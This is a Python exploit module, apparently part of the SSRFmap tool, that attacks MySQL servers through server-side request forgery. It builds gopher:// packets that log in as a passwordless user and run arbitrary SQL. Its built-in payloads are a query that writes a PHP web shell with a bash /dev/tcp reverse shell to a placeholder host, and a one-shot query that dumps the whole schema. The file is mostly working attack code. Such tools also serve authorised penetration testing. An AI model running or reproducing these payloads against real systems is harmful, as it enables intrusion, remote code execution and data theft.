from ssrfmap.core.utils import *
import logging
import binascii

# NOTE
# This exploit is a Python 3 version of the Gopherus tool

name        = "mysql"
description = "Execute MySQL command < 8.0"
author      = "Swissky"
documentation = [
    "https://spyclub.tech/2018/02/05/2018-02-05-ssrf-through-gopher/",
    "https://github.com/eboda/34c3ctf/tree/master/extract0r",
    "https://infosec.rm-it.de/2018/07/29/isitdtu-ctf-2018-friss/",
    "http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6"
]

class exploit():
    user    = "root"
    query   = "SELECT database();#"
    reverse = "select \"<?php system('bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1'); ?>\" INTO OUTFILE '/var/www/html/shell.php'"
    dios    = "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#"


    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Encode the username for the request
        self.user = input("Give MySQL username: ")
        encode_user = binascii.hexlify( self.user.encode() )
        user_length = len(self.user)
        temp   = user_length - 4
        length = '{:x}'.format(0xa3 + temp)

        # Authenticate to MySQL service - only work with users allowed without password
        dump  = length+ "00000185a6ff0100000001210000000000000000000000000000000000000000000000"
        dump += encode_user.decode()
        dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"
        dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"
        dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c"

        query = input("Give MySQL query to execute (reverse/dios or any SQL statement): ")

        # Reverse shell - writing system() in /var/www/html/shell.php
        if query == "reverse":
            self.query = self.reverse
            if args.lhost == None: 
                self.query = self.query.replace("SERVER_HOST", input("Server Host:"))
            else:
                self.query = self.query.replace("SERVER_HOST", args.lhost)

            if args.lport == None: 
                self.query = self.query.replace("SERVER_PORT", input("Server Port:"))
            else:
                self.query = self.query.replace("SERVER_PORT", args.lport)
        
        # Dump in one shot - extract every databases/tables/columns 
        elif query == "dios":
            self.query = self.dios

        else:
            self.query  = query

        auth = dump.replace("\n","")

        # For every IP generated, send the payload and extract the result
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            payload = self.get_payload(self.query, auth, ip)
            logging.info("Generated payload : {}".format(payload))

            r1 = requester.do_request(args.param, payload)
            r2 = requester.do_request(args.param, "")
            if r1 != None and r2!= None:
                diff = diff_text(r1.text, r2.text)
                logging.debug(diff)


    def encode(self, s, ip):
        a = [s[i:i + 2] for i in range(0, len(s), 2)]
        return wrapper_gopher("%"+"%".join(a), ip, "3306")


    def get_payload(self, query, auth, ip):
        if(query.strip()!=''):
        	query = binascii.hexlify( query.encode() )
        	query_length = '{:x}'.format((int((len(query) / 2) + 1)))
        	pay1 = query_length.rjust(2,'0') + "00000003" + query.decode()
        	final = self.encode(auth + pay1 + "0100000001", ip)
        	return final
        else:
    	    return self.encode(auth, ip)
